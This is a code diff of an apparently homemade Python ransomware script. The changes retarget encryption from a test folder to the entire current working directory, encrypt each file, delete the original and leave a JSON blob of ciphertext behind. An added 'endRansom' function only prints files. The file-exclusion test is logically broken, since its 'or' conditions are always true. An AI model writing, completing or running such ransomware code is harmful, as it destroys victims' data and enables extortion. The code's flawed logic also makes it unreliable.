@@ -166,28 +166,40 @@ def startRansom():
 	privateKeyPath = os.path.join(keyFolder, "private_key")
 	publicKeyPath = os.path.join(keyFolder, "public_key")
 
-	for dirName, subDirList, fileList in os.walk("encryptThis"):
+	for dirName, subDirList, fileList in os.walk(os.getcwd()):
 		print('Found directory: %s' % dirName)
 		for fileName in fileList:
 			if(fileName != 'encryption.py' or fileName != 'decryption.py' or fileName != 'rsakeys.py' or fileName != 'constants.py'):
-				
-				createJSON(fileName, RSACipher, cipherFile, iv, tag, fileExt) = myRSAEncrypt(os.path.join(dirName,fileName), publicKeyPath)
-				
-				print('\t%s' % fileName)
+				file = os.path.join(dirName, fileName)
+				(RSACipher, cipherFile, iv, tag, fileExt) = myRSAEncrypt(file, publicKeyPath)
+				os.remove(file)
+				createJSON(file, RSACipher, cipherFile, iv, tag, fileExt)
+								
+				print('\t%s' % file)
 
+
+def endRansom():
+	for dirName, subDirList, fileList in os.walk(os.getcwd()):
+		for fileName in fileList:
+			print(fileName)
+			with open(fileName) as json_file:
+				data = json.load(json_file)
+				print(data)
 
 # Create a JSON file
 def createJSON(fileName, RSACipher, cipherFile, iv, tag, fileExt):
+	name, ext = os.path.splitext(fileName)
 	data = {}
-	data["fileName"] = fileName
-	data["RSACipher"] = RSACipher
-	data["cipherFile"] = cipherFile
-	data["iv"] = iv
-	data["tag"] = tag
-	data["fileExt"] = fileExt
-	
-	with open(fileName, 'wb') as file:
-		json.dump(data, file) 
+	data['fileName'] = name
+	data['RSACipher'] = base64.encodestring(RSACipher).decode('ascii')
+	data['cipherFile'] = base64.encodestring(cipherFile).decode('ascii')
+	data['iv'] = base64.encodestring(iv).decode('ascii')
+	data['tag'] = base64.encodestring(tag).decode('ascii')
+	data['fileExt'] = fileExt
+	with open(name, 'w') as file:
+		file.write(json.dumps(data))
+		file.close()
+		
 
 # AES requires plain text and ciphertext to be a multiple of 16
 # We pad it so that the message is a multiple of the IV, 16
